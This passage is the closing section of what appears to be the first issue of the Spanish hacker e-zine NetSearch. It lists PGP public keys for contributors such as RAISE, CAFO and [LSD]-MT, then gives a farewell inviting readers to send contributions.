qmYDg9k4Oqdm4PiRwrgXtK9lKBCzB1QJaOBBEcV5OdnZMbhSF4O1pyga1sMyUSyi
tWOVt7T7A1gyWKZQoCp72gVMMPvAV96xzY+Sm7rdKT+R9RPPWhHuDlQ8KTdxozox
sFWcG4kARgQYEQIABgUCNznqUAAKCRB5NuHMWn1sOAtFAJ93Tlu5DYLfMUyc8XWE
VFB2CMW0bQCg23ZqYxUTcsmG8KRRbcpXvS/crdw=
=iVAf
-----END PGP PUBLIC KEY BLOCK-----


 + LLAVE PGP DE }MOEB|UZ{


-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 6.0.2i

mQGiBDkIdP4RBADAwpXHE+z4FcIOh9ISkYflt/kumnarEQKt1HJIv094mX1/3yna
k38OfIXGUcBiN+znzoZUYwVOEUhJIGcEXph8wX9CNu73IZtHn+kcm7zczASs1VLA
5bOorepMZbAz0WiNrBQTvcOSQCDF6E3Ubnh2P98fjZ6giVyATgP+HI/8hwCg/3bZ
TgcFZ1VQZOavwVsXIfgzdysD/iEwEtUoBzoSo4bLbHkoXrH2xSWNvhk5gYIWnSsb
oqV7LPi+oOZhoKWm3ACgo2yYpp4SNFglLd8saRS3jL8j+2xY7RJH4+7gBqH7Yt9h
vfwPT9R+k1JcmHTHZYVE/fNjB/UfcfDGFrwNrSs0YFdZ0A+8vqjDBOPw9P8M95de
NsDrA/9kwfoDm7AFiAMPwbZma+/n7MrP18BrLZeqQkm7U0J5lG0qceyrd3FNRwma
01GDxsmA0aVJprtyQY66E7EUBMOe9H3LTpOGEdgiz6yvshoTupEUrARrEs8hdsbK
1bnK2xmyAYdCswxJIBkB13ESc4Jp+1XUv8EG6kPPOpyIreyT27QffU1vZWJ8dVp7
IDxtb2ViaXV6QGJpb2dhdGUuY29tPokASwQQEQIACwUCOQh0/wQLAwIBAAoJEDts
aX7puSUM5TkAoKkWZz9AhJZoVaI0bNRNvOl+yo9nAKCVzy5U7Ww8E9VOfKAjHO5s
miDDtLkCDQQ5CHT/EAgA9kJXtwh/CBdyorrWqULzBej5UxE5T7bxbrlLOCDaAadW
oxTpj0BV89AHxstDqZSt90xkhkn4DIO9ZekX1KHTUPj1WV/cdlJPPT2N286Z4VeS
Wc39uK50T8X8dryDxUcwYc58yWb/Ffm7/ZFexwGq01uejaClcjrUGvC/RgBYK+X0
iP1YTknbzSC0neSRBzZrM2w4DUUdD3yIsxx8Wy2O9vPJI8BD8KVbGI2Ou1WMuF04
0zT9fBdXQ6MdGGzeMyEstSr/POGxKUAYEY18hKcKctaGxAMZyAcpesqVDNmWn6vQ
ClCbAkbTCD1mpF1Bn5x8vYlLIhkmuquiXsNV6TILOwACAggA1D+Ae7MCH5I6G1hb
1Oq0z4zN3gzA6yPvfxhu+sjKc62oeqkh8LORKBPgfi3POqgyyUlcNad3eQFjRvhm
Aw+/83rPY+ZjhMhtCbRwFkr223KmBS06fBgRAFQF/vEbdJswe+T2Rdi6mavu1HdD
nS04F1RPwltJt8drqizABzfQyYuAPn4XfkiOO/hhY8qYPTNOZ9PYOLpjNZFUrCYX
aMIypsZPn52CMEbiUAlAGKVFxMYdapwhxW8bSfM3gLjqv9wgTvHc9dMcE2cKqycj
NV5Zl4X0lydFl3wHPHqEmCNNKrOAjnqAoGk8mhMJj4CDnaK730hPFLQSVDHq2a2C
6D1vqokARgQYEQIABgUCOQh0/wAKCRA7bGl+6bklDB1FAKDsmcSoE3/wo0aiQGX/
mJCDMPIa3QCggsilNGROnCxNTFWSoYpC+nZsWe8=
=sfip
-----END PGP PUBLIC KEY BLOCK-----


 + LLAVE PGP DE RAISE


-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 6.0.2i

mQENAzXrEhAAAAEIAMpdf1Cp68n09E9D1J7E0XyDRFLg5m3W+Q/kGScRndBAcXRP
o6lUbdhA6JV9UJIpQsg0GoHTdLMcid3oLMnQLw7YD3d0hcN0tMCMmoc9wxm3cZFO
RNoEUz5wIGt52j3yJWa7mK26V4+xIeWc346p/pnzRRDj6VLUO2xCwmIKP7/tcyce
zfdYIwewTnVkaArRiO/EfIrp03AMf7WOb9RcKVtKeqywi+CLh5Jxtr1KT2abJRG5
iRdElDhQaL0y4wUUKuf0IwaIOOyGlHOjWpZxF59Lh8YmNXACa/RO7sSHtMc2flp/
G384N7LIz53n+7a3YMq/9++L5I9wU+O7NqidbYUABRG0GVJhaVNlIDxyYWlzZUBi
aW9nYXRlLmNvbT4=
=G6Xl
-----END PGP PUBLIC KEY BLOCK-----


 + LLAVE PGP DE CAFO


-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 5.0i for non-commercial use

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
r9Vo
=en2Z
-----END PGP PUBLIC KEY BLOCK-----


 + LLAVE PGP DE [LSD]-MT

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 6.0.2i

mQGiBDc10VERBADAHcYcRryTiE/k+/yMO7LeuN5bYhLa5MJwaPEyeYF8rq7GRl8K
XH711W6RavbguvCb5IvK8sz/j33WBZFcRcmieDUwbRAZG8a4GDgp53pK9IMMgFb2
hqSid6+n3AOj1vss87pfjTLHBdEl8lQTlf35mtOAp/kW3bTAD4Svy90HTwCg/5Zp
074nBVpQil6thSRpZs4l7t0D/RwZm0Mncz5LNxkjcXmSesa3izLcSiY8bWgmuV/u
YG0445Zg31Nlv89iVKSVt6d5Q3oK1f9H8I12DirSliin6ad3oYkiakFHIIu0Q7zZ
A1tQSxnUP7abLKXYmasfTj3v2mH8MGmYNDwxUqM8XXnahRPKe04w9y4KquZ55V46
hiR3A/9a697J6GQgy+jXYIzuuaLQYgbrYgZeJooEX61Wk7RwHy+p/r3n1ZzOyO+6
8fyl64A91OJVAD/RiYJ60adZSwbw2nXt8TSE7aHgXWsDaCbcpKQy7XM1En/1CnLR
l6tru20jZxGlGFOABaOan+nAagN6r6FH2aiwssD96Vve2CMfRbQVTHNEIDxkYWZv
QGFycmFraXMuZXM+iQBLBBARAgALBQI3NdFRBAsDAgEACgkQfnxNcZmK149aMgCg
/2YDU5fUDZ95pgPoght7XbhJC+QAoInbk7yyxj3U4wuT46Kq3y8S+EjluQINBDc1
0VEQCAD2Qle3CH8IF3KiutapQvMF6PlTETlPtvFuuUs4INoBp1ajFOmPQFXz0AfG
y0OplK33TGSGSfgMg71l6RfUodNQ+PVZX9x2Uk89PY3bzpnhV5JZzf24rnRPxfx2
vIPFRzBhznzJZv8V+bv9kV7HAarTW56NoKVyOtQa8L9GAFgr5fSI/VhOSdvNILSd
5JEHNmszbDgNRR0PfIizHHxbLY7288kjwEPwpVsYjY67VYy4XTjTNP18F1dDox0Y
bN4zISy1Kv884bEpQBgRjXyEpwpy1obEAxnIByl6ypUM2Zafq9AKUJsCRtMIPWak
XUGfnHy9iUsiGSa6q6Jew1XpMgs7AAICB/9T3si4UJ5/IKb5QTISOzn1vkPoTz4U
OA0okQTmlc+Ytjl4nNUq3jCKvVUf6mMBYK1h/V9poQLgNL4age1xxgDiBcrHZ/TH
mfHMsRDtlzLibGV/9+mbqa33m5/PbbkBnZVi6GZruqQfGpeyLrcuIdpLdA9loplh
J4DGLXuLFzGdepsepQXcj8SkdjfIDfklEmnFGglqSnU2IzIbyeoOaw6tG6poHiHJ
luq61nzhFb+lqlYcV6oIlGKXSo8m9Yphvq2AQ8FaBjKC+dnjsj3N0qj+m70PqLcd
+rEg1F/mKsDnPu+iUG2RRLoBZpR8BB6RASnd7sGHwBq5U/VS0TT0kuhTiQBGBBgR
AgAGBQI3NdFRAAoJEH58TXGZiteP6WcAnj5bnpfuau+Yr7b++dhbVwV0LoMlAKC2
QvBSXofLRS9NLX4sPT0kZF99zQ==
=G8HO
-----END PGP PUBLIC KEY BLOCK-----



==============================================================================
------------------------------------------------------------------------------
==============================================================================


 + DESPEDIDA

     Bueno, casi sin darnos cuenta, hemos llegado al final de este primer
numero... a que no ha sido tan palo? :)) Bueno, fuera co¤as, esperamos que os
haya gustado y que colaboreis pronto, ya que me imagino que habreis visto
que no tenemos una "estructura jerarquica", digamos que predomina la anarquia
moderada :) ademas de que no existen miembros, el que quiere colabora y el
que no quiere, no. Asi que vuestras colaboraciones se hacen IMPRESCINDIBLES.

     De parte de NetSearch, un saludo y hasta pronto...


EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-Eo
